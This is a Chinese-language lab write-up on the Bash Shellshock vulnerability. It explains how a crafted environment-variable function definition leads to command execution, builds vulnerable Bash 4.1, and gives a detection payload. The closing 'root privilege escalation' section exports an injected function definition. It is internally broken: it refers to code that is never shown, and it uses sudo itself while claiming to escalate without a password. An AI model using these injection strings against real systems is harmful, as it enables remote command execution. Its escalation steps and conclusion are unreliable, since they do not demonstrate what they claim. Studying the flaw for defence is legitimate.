# Bash Shellshock 漏洞分析与复现

## 一、漏洞介绍
* 2014年09月25日，CVE官方发布了漏洞CVE-2014-6271
* Shellshock利用了Bash在导入环境变量函数时候的漏洞，启动Bash的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。
* 在有些CGI脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用Shellshock漏洞的机会。
* 简单来说就是由于服务器的cgi脚本调用了bash命令，由于bash版本过低，攻击者把有害数据写入环境变量，传到服务器端，触发服务器运行Bash脚本，完成攻击。

## 二、漏洞原理

* Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统，这是典型的数据和代码没有进行正确区分导致的漏洞

* 受到该漏洞影响的bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义的。而在处理这样的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的shell命令

## 三、漏洞复现

### 1、下载配置Bash 4.1
* 命令行 ：
* wget http://labfile.oss.aliyuncs.com/bash-4.1.tar.gz(下载)
* tar xf bash-4.1.tar.gz（解压）
* cd bash-4.1（进入目录）
* ./configure
* make & make install（安装）
* bash -version
![](https://github.com/AD-0x1A/Bash-Shellshock-/blob/master/picture/1.png)
![](https://github.com/AD-0x1A/Bash-Shellshock-/blob/master/picture/2.png)
![](https://github.com/AD-0x1A/Bash-Shellshock-/blob/master/picture/4.png)
### 2、检测漏洞是否存在
* 命令行：
* env x=’() { :; };echo vulnerable’ bash -c “echo this is a test”
![](https://github.com/AD-0x1A/Bash-Shellshock-/blob/master/picture/5.png)
* 可以看到，终端中除了输出this is a test，而且同时输出了 Vulnerable，证明该漏洞存在

## 四、漏洞利用，root权限提取
* 编写以下代码，编译运行
* 命令行：sudo ln -sf /bin/bash /bin/sh：使/bin/sh指向/bin/bash
* 命令行：export foo="() { :; }; bash"
* 命令行：sudo su
![](https://github.com/AD-0x1A/Bash-Shellshock-/blob/master/picture/6.png)
![](https://github.com/AD-0x1A/Bash-Shellshock-/blob/master/picture/7.png)
![](https://github.com/AD-0x1A/Bash-Shellshock-/blob/master/picture/8.png)
* 可以看到，当输入sudo su后，命令行在不需要输入密码时权限变为root，实现了root权限的提权
